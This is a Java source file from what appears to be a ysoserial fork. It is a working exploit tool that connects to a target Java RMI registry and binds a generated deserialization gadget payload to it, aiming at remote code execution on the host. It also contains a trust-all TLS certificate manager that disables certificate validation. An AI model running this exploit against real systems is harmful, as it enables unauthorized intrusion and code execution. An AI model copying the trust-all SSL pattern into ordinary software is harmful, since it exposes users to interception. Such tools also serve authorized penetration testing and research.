package org.su18.ysuserial.exploit;

import java.io.IOException;
import java.net.Socket;
import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIClientSocketFactory;
import java.security.cert.X509Certificate;
import java.util.concurrent.Callable;
import javax.net.ssl.*;

import org.su18.ysuserial.GeneratePayload;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.secmgr.ExecCheckingSecurityManager;

/*
 * Utility program for exploiting RMI registries running with required gadgets available in their ClassLoader.
 * Attempts to exploit the registry itself, then enumerates registered endpoints and their interfaces.
 *
 * TODO: automatic exploitation of endpoints, potentially with automated download and use of jars containing remote
 * interfaces. See http://www.findmaven.net/api/find/class/org.springframework.remoting.rmi.RmiInvocationHandler .
 */
@SuppressWarnings({"rawtypes", "unchecked"})
public class RMIRegistryExploit {

	private static class TrustAllSSL implements X509TrustManager {

		private static final X509Certificate[] ANY_CA = {};

		public X509Certificate[] getAcceptedIssuers() {
			return ANY_CA;
		}

		public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }

		public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
	}

	private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {

		public Socket createSocket(String host, int port) throws IOException {
			try {
				SSLContext ctx = SSLContext.getInstance("TLS");
				ctx.init(null, new TrustManager[]{new TrustAllSSL()}, null);
				SSLSocketFactory factory = ctx.getSocketFactory();
				return factory.createSocket(host, port);
			} catch (Exception e) {
				throw new IOException(e);
			}
		}
	}

	public static void main(final String[] args) throws Exception {
		final String host     = args[0];
		final int    port     = Integer.parseInt(args[1]);
		Registry     registry = LocateRegistry.getRegistry(host, port);

		// test RMI registry connection and upgrade to SSL connection on fail
		try {
			registry.list();
		} catch (ConnectIOException ex) {
			registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
		}


		// 去除前两个参数
		String[] newArray = new String[args.length - 2];
		System.arraycopy(args, 2, newArray, 0, newArray.length);

		GeneratePayload.main(newArray);
		final Object payloadObject = GeneratePayload.PAYLOAD;

		// ensure payload doesn't detonate during construction or deserialization
		final Registry finalRegistry = registry;
		new ExecCheckingSecurityManager().callWrapped(new Callable<Void>() {
			public Void call() throws Exception {
				String name   = "su18";
				Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payloadObject), Remote.class);
				try {
					finalRegistry.bind("su18", remote);
				} catch (Throwable e) {
					e.printStackTrace();
				}
				return null;
			}
		});
	}

}
